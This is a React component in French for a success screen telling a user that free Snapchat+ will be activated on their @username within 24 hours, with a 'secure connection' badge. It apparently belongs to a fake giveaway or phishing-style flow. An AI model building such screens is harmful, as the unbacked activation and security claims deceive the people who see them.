import { motion } from "framer-motion";
import { CheckCircle2 } from "lucide-react";
import Logo from "@/components/Logo";

export default function VerificationSuccess({ data }) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, ease: "easeOut" }}
      className="w-full max-w-sm mx-auto">
      
      <div className="bg-card border border-border rounded-3xl px-6 py-10 shadow-2xl shadow-black/60 text-center">

        {/* Logo */}
        <div className="mb-6">
          <Logo />
        </div>

        {/* Check icon */}
        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-green-900/40 border border-green-500/30 rounded-2xl flex items-center justify-center">
            <CheckCircle2 className="w-10 h-10 text-green-400" />
          </div>
        </div>

        {/* Title */}
        <h2 className="font-heading text-2xl font-black text-green-400 mb-3">
          Vérification Réussie !
        </h2>

        {/* Subtitle */}
        <p className="text-muted-foreground text-sm mb-5 leading-relaxed px-2">
          Votre <span className="text-primary font-bold">Snapchat+</span> va être activé sous peu sur le compte
        </p>

        {/* Snapchat username badge */}
        <div className="bg-secondary/50 border border-border rounded-xl px-5 py-3.5 mb-6 inline-flex items-center gap-2">
          <span className="text-primary text-lg">✨</span>
          <span className="font-bold text-foreground text-base">@{data?.snapchat}</span>
        </div>

        {/* Delay info */}
        <p className="text-muted-foreground text-sm mb-8 leading-relaxed px-2">
          L'activation peut prendre jusqu'à 24h. Vous recevrez une notification sur Snapchat.
        </p>

        {/* Security */}
        <p className="text-muted-foreground/50 text-xs mb-3">
          🔒 Connexion sécurisée • Données protégées
        </p>

        {/* Footer */}
        <p className="text-muted-foreground/40 text-xs leading-relaxed">
          L'abonnement Snapchat+ ne vous sera pas facturé.<br />
          L'abonnement est disponible uniquement pour les utilisateurs éligibles.
        </p>
      </div>
    </motion.div>);

}